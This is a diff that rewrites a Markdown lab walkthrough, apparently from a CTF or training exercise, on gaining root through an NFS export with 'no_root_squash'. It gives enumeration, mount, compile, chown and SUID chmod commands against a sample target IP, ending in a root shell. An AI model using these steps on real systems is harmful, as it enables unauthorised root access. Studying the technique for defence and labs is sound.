@@ -1,10 +1,17 @@
 # 🔐 Privilege Escalation: Network File Sharing (NFS)
 
-Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.
+Privilege escalation vectors are not limited to local access. Shared folders and remote services such as SSH, Telnet, and NFS can also lead to root access on the target system.
+
+In some scenarios, combining multiple techniques may be required. For example, discovering a root SSH private key on the target machine and using it to log in via SSH instead of escalating the current user's privileges.
+
+In this case, we will abuse a misconfigured NFS share with the `no_root_squash` option enabled.
 
 ---
 
-to this file in victim machine use :
+## 🔍 Checking NFS Shares on the Victim Machine
+
+On the target machine, check exported NFS shares using:
+
 ```bash
 cat /etc/exports
 ```
@@ -13,30 +20,47 @@ cat /etc/exports
 
 ---
 
-to know from your machine use :
+## 🔍 Enumerating NFS Shares from the Attacker Machine
+
+From the attacker machine, enumerate available NFS shares using:
+
 ```bash
-showmount -e <IP_Target>
+showmount -e <TARGET_IP>
 ```
 
 ![img](screenshots/NFS/know_nfs_my_machine.png)
 
 ---
-it must include " no_root_squash " to can exploit it
 
-in this case have three file :
+## 📌 Vulnerable Configuration
 
+To exploit NFS for privilege escalation, the export must include:
+
+```bash
+no_root_squash
+```
+
+In this case, the following vulnerable shares were discovered:
+
+```bash
 /home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
 /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
 /home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+
+The `no_root_squash` option allows files created by the root user on the attacker machine to remain owned by root on the target system.
 
 ---
 
-to connect my file with this file we use :
+## 🔗 Mounting the NFS Share
+
+To mount the NFS share locally, use:
 
 ```bash
-sudo mount -o rw <IP_Target>:<Path_of_NFS> <My_Path>
+sudo mount -o rw <TARGET_IP>:<NFS_PATH> <LOCAL_PATH>
 ```
-example :
+
+Example:
 
 ```bash
 sudo mount -o rw 10.114.144.72:/tmp /tmp/nfs_mount
@@ -46,11 +70,11 @@ sudo mount -o rw 10.114.144.72:/tmp /tmp/nfs_mount
 
 ---
 
-then create file.c and write exploit code 
+## ✍️ Creating the Exploit File
 
-![img](screenshots/NFS/nano_nfs.png)
+Create a file named `nfs.c` and add the following code:
 
-```bash
+```c
 #include<stdio.h>
 #include<stdlib.h>
 #include<unistd.h>
@@ -64,29 +88,45 @@ int main()
 }
 ```
 
+![img](screenshots/NFS/nano_nfs.png)
+
 ![img](screenshots/NFS/exploit_code.png)
 
-compile it by 
+---
+
+## ⚙️ Compiling the Exploit
+
+Compile the exploit statically using:
 
 ```bash
 gcc nfs.c -o nfs -static
 ```
+
 ![img](screenshots/NFS/compile_it.png)
 
-change owner to run as root ,and permission
+---
+
+## 🔧 Setting Root Ownership and SUID Permissions
+
+Change the file owner to root and enable the SUID bit:
 
 ```bash
 sudo chown root:root /tmp/nfs_mount/nfs
 sudo chmod +s /tmp/nfs_mount/nfs
 ```
 
- ![img](screenshots/NFS/change_own_perm.png)
+![img](screenshots/NFS/change_own_perm.png)
 
 ---
 
-from victim machine go to tmp and run it 
+## 🚀 Executing the Exploit on the Victim Machine
+
+On the victim machine, navigate to the mounted share and execute the file.
+
+The binary now runs with root privileges because of the SUID bit and the `no_root_squash` configuration.
 
 ![img](screenshots/NFS/file_suid_root.png)
 
-![img](screenshots/NFS/get_root_nfs.png)
+A root shell is obtained successfully.
 
+![img](screenshots/NFS/get_root_nfs.png)
